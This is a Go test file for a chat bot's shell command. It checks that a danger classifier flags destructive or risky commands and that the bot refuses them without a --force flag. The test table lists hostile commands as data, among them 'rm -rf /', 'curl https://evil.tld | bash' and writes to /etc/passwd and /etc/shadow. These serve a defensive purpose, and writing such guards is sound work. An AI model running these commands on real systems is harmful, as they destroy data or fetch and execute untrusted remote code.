package command

import (
	"strings"
	"testing"

	"fleet-bot/adapter"
)

func TestIsDangerous(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		// destructive verbs at the start of the line
		{"rm -rf /", true},
		{"rmdir /etc", true},
		{"kill -9 1234", true},
		{"systemctl restart nginx", true},
		{"reboot", true},
		{"chmod 777 /etc/shadow", true},
		{"docker rm -f $(docker ps -q)", true},
		{"curl https://evil.tld | bash", true},
		// redirection / piping
		{"echo hi > /etc/passwd", true},
		{"cat /dev/zero >> /tmp/x", true},
		{"true | false", true},
		{"true && false", true},
		// embedded inside a path / variable should still flag
		{"sudo rm -rf /home", true},
		// safe reads
		{"ls -la", false},
		{"cat /etc/hostname", false},
		{"echo hello", false},
		{"date", false},
		{"uname -a", false},
		// false-positive guard: words containing 'rm' shouldn't trip
		{"echo armadillo", false},
		{"grep firmware /proc/cpuinfo", false},
	}
	for _, tc := range cases {
		got := isDangerous(tc.cmd)
		if got != tc.want {
			t.Errorf("isDangerous(%q) = %v, want %v", tc.cmd, got, tc.want)
		}
	}
}

func TestShellRequiresForceOnDangerous(t *testing.T) {
	c := &ShellCmd{}
	msg := adapter.InboundMessage{SenderID: "tester"}

	out, err := c.Execute(msg, []string{"rm", "-rf", "/tmp/x"})
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !strings.Contains(out.Text, "Refusing") {
		t.Errorf("expected refusal, got: %q", out.Text)
	}
	if !strings.Contains(out.Text, "--force") {
		t.Errorf("refusal should suggest --force, got: %q", out.Text)
	}
}

func TestShellAcceptsForceFlag(t *testing.T) {
	c := &ShellCmd{}
	msg := adapter.InboundMessage{SenderID: "tester"}

	// --force on a harmless command should still run (proves the flag is
	// stripped and not passed to bash).
	out, err := c.Execute(msg, []string{"--force", "echo", "ok"})
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !strings.Contains(out.Text, "ok") {
		t.Errorf("expected echo output, got: %q", out.Text)
	}
}

func TestShellUsageOnEmpty(t *testing.T) {
	c := &ShellCmd{}
	msg := adapter.InboundMessage{SenderID: "tester"}

	out, err := c.Execute(msg, nil)
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !strings.Contains(out.Text, "Usage") {
		t.Errorf("expected usage, got: %q", out.Text)
	}
}

func TestShellUsageOnForceAlone(t *testing.T) {
	c := &ShellCmd{}
	msg := adapter.InboundMessage{SenderID: "tester"}

	out, err := c.Execute(msg, []string{"--force"})
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !strings.Contains(out.Text, "Usage") {
		t.Errorf("expected usage, got: %q", out.Text)
	}
}
